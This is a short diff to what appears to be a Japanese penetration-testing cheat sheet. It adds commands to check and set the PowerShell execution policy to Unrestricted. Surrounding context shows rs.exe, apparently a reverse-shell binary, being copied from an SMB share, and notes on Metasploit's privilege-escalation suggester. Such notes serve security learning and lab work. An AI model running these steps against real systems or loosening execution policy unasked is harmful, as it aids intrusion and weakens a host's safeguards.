@@ -1153,6 +1153,15 @@ dir \\10.10.10.1\temp
 copy \\10.10.10.1\temp\rs.exe rs.exe
 ```
 
+### Powershell
+#### Powershellスクリプトの実行
+```
+現在のユーザーの実行ポリシーの確認:
+Get-ExecutionPolicy -Scope CurrentUser
+現在のユーザーの実行ポリシーの変更:
+Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
+```
+
 ### metasploit(local_exploit_suggester)
 exploitをせずに脆弱性をチェックするために使用するモジュール。
 meterpreterでシェルを取得している場合、これを使うことで特権昇格に使えるexploitを簡単に探すことができる。
